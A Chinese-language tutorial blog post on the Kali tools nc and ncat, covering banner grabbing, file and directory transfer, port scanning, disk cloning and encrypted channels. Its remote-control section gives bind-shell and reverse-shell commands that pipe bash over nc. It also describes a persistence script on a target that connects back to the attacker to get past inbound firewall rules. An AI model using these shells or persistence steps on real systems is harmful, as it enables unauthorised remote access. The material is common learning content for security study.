---
layout: post
title: "kali基本工具 - nc/ncat"
date: 2019-04-03
excerpt: "nc 和 ncat的基本命令和使用"
tags: [security, penetration test, kali linux]
comments: false
share: false

---

kali 经常使用的基本工具，包括Nc/ncat, Wireshark, Tcpdump

### Netcat（NC）

NC可以做的事情：    
- 侦听模式、传输模式
- telnet、获取banner信息
- 传输文本信息
- 传输文件、目录
- 加密传输文件
- 远程控制、木马
- 加密所有流量（ncat）
- 流媒体服务器
- 远程克隆硬盘

1. Telnet、banner

    作为客户端，模仿telnet的功能，可以连接其他服务器的端口，发送命令    
    ```bash
    nc -nv 1.1.1.1 110
    ```
    这里，`-n`表示直接使用IP地址，而不适用dns解析域名，`-v`表示输出详细信息，接着后面跟IP地址和端口，连接成功之后，就可以发送命令

    - 连接POP3, SMTP服务器
    - 连接HTTP服务器

2. 传输文本信息&电子取证

    ```bash
    nc -l -p 4444
    nc -nv 1.1.1.1 4444
    ```
    第一条命令是服务器启用的命令，`-l`表示侦听端口的模式，`-p`表示指定的端口，这里指定4444  
    ```bash
    netstate -pantu | grep 4444
    ```
    检测是否监听4444端口    
    第二条命令是客户端启用的命令，和上述说明的一样，作用是连接指定服务器的指定端口 

    通过这种方法，可以作为*电子取证*的手段。电子取证的要求是，尽可能不去更改目标机器的文件。实现思路是，在一台机器上用nc开一个端口作为服务端，在目标机上使用命令，后面跟上管道符`| nc -nv ip-address port`，就可以把原本输出在目标机器上的内容，输出到服务端

    如果内容较多，服务端可以将收到的内容重定向到一个文件
    ```bash
    nc -l -p 4444 > result.txt
    ```
    在客户端，可以使用`-q num`表示执行命令之后，延迟`num`秒，断开nc的连接，这样做的目的是，可以知道命令到底有没有执行完，如果没有这个参数，nc会一直连接，不知道命令是否执行结束



3. 传输文件，目录

    这里服务端指定为开启侦听端口的主机，客户端指定为连接目标IP地址的主机

    - 客户端向服务端传输文件

        服务端，将接收到的内容输出到`1.MP4`这个文件里面
        ```bash
        nc -lp 4444 > 1.mp4
        ```

        客户端，把`1.MP4`这个文件作为内容，输入到`ipaddress port`
        ```bash
        nc -nv ipaddress port < 1.mp4 -q 1
        ```

    - 服务端向客户端传输文件

        服务端，先侦听端口，让后把`1.MP4`文件作为输入内容，等待一个连接者连接，然后`-q`关闭连接
        ```bash
        nc -lp 4444 < 1.mp4 -q 1
        ```

        客户端，连接ip地址，将接收到的内容输出到`1.MP4`文件
        ```bash
        nc -nv ipaddress port > 1.mp4
        ```

        - 是否，如果服务端不加`-q`参数，那么客户端每一次的连接都会收到服务端预先发送的内容？  
            是这样的，但是nc侦听一个端口，只能保持连接一个客户端，不能同时连接两个客户端

        - 如果服务端指定了等待客户端接收文件，而客户端没有指定保存文件，最后会输出什么？
            会直接输出文件里面的内容，如果是文本文件，就输出文本信息，如果是媒体文件，会以文本内容的形式输出，都是乱码

        - 如果是先打开客户端呢？
            `nc -nv ipaddress port`连接失败，因为服务端没有开启
        
    - 目录传输

        不能直接传输目录，思路是，服务端先将目录打包成一个文件，然后就可以利用文件传输的方法，传输一个压缩包，客户端接收压缩包，解压。

        服务端
        ```bash
        tar -cvf - dir_name/ | nc -lp 4444 -q 1
        ```

        客户端
        ```bash
        nc -nv ipaddress port | tar -xvf  - 
        ```

        - 这个命令的空`-``是什么意思？
        - 应该有其他的命令组合
    
    - 加密传输

        思路和目录传输类似，作为传输方，利用第三方工具，先对文件进行加密，然后通过管道符传给nc，接收端将接收到的文件解密到指定的文件

        客户端向服务端传输加密文件

        服务端：
        ```bash
        nc -lp 4444 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4
        ```

        客户端：
        ```bash
        mcrypt -flush -Fbq -a rijndael-256 -m ecb < a.mp4 | nc -nv ip_address port -q 1
        ```

        客户端输入命令之后，需要输入秘钥，然后服务端也要输入相同的秘钥


4. 流媒体服务器

    服务器向客户端发送流媒体文件，客户端以流的形式直接播放媒体文件

    服务端：
    ```bash
    cat 1.mp4 | nc -lp 4444
    ```

    客户端
    ```bash
    nc -nv ip_addredd port | mplayer -vo x11 -cache 3000 - 
    ```
    `-vo`是指定显示驱动，`-cache 3000`指定缓存大小

5. 端口扫描

    ```bash
    nc -nvz ip_address port_range
    ```

    `-z`，在`-h`里面的说明是`zero-I/O mode`，这意思是，netcat不会和I/O输入输出进行交互，只是获取端口是否有打开的信息

    这里默认是探测TCP的端口，也可以指定UDP端口

    ```bash
    nc -nvzu ip_address port_range
    ```

- 远程克隆硬盘

    主要命令：dd，完整复制硬盘信息  
    客户端发送克隆硬盘给服务端

    服务端
    ```bash
    nc -lp 4444 |dd of =/dev/sda
    ```

    客户端
    ```bash
    dd if = /dev/sda | nc -nv ip_address 4444 -q 1
    ```


6. 远程控制
    
    客户端控制服务端

    服务端
    ```bash
    nc -lp 4444 -c bash
    ```

    客户端
    ```bash
    nc -nv   ip_address port
    ```

    反向，客户端控制服务端，客户端主动发送bash给服务端，让服务端控制
    此处的`-c`，表示`shell commands`后面接的是shell的命令

    服务端
    ```bash
    nc -lp 4444 
    ```

    客户端
    ```bash
    nc -nv ip_address port -C bash
    ```

    如果是攻击方，可以通过在目标机器上添加一个启动脚本，脚本内容是通过nc主动连接攻击方的主机，这样做可以绕过防火墙的‘外到内’的规则的过滤

    有点奇怪的是，在ubuntu下载的nc，没有-c的功能(不同发行版的nc是不同的)


---

### ncat

nc的缺点，明文传输、本身没有加密能力、没有身份验证  
ncat可以弥补nc的缺陷，是nc的加强版。在kali，ncat作为单独的安装包出现，在ubuntu，ncat包含在nmap工具包里面

利用ncat，使用管道的方式进行连接

服务端
```bash
ncat -c bash --allow  client_ip_address -vnl port --ssl
```

`--allow`，表示允许哪个ip地址和本机进行连接
`--ssl`，使用ssl加密

客户端
```bash
ncat -nv host_ip_address --ssl
```

在上述例子中，服务端指定了来源的IP地址，达到了身份验证的效果。

在使用`--ssl`的时候，报出了错误：
````bash
SSL_CTX_use_certificate(): error:140AB18F:SSL routines:SSL_CTX_use_certificate:ee key too small
````
是这样的，一开始系统自带的nmap似乎没有给我装上ncat（在命令行里面找不到），后来只能apt下一个，版本是7.70，就报了上面的错。后来我在ubuntu也装了一个nmap，版本是7.60，里面有自带的ncat，却是可以使用`--ssl`，没有报错。

后来搞了很久，最后只能确定为，是openssl的问题，没有找到直接的解决办法。

最后的解决办法是，下了一个7.50的ncat，就没有问题（7.60在kali里面也报同样的错）

ref：
[感谢HAT的博客](https://hoanganhtuan.wordpress.com/2019/01/25/ncat-version-7-6-and-above-doesnt-support-tls-1-2/)
[https://nmap.org/book/inst-linux.html#inst-linux-other](https://nmap.org/book/inst-linux.html#inst-linux-other)




